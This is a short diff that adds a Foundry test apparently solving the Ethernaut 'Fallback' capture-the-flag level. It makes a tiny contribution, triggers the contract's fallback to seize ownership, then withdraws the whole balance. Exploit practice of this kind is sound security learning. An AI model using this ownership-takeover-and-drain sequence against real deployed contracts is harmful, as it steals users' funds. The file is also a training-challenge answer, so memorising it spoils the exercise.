@@ -16,6 +16,15 @@ contract TestFallback is Test {
     function testSolution() public {
         vm.startPrank(player);
 
+        console.log("owner: ", instance.owner());
+        console.log("player: ", player);
+
+        instance.contribute{value: 1}();
+        console.log("contributions: ", instance.getContribution());
+
+        address(instance).call{value: 1}("");
+        instance.withdraw();
+
         assertEq(instance.owner(), player);
         assertEq(address(instance).balance, 0);
 
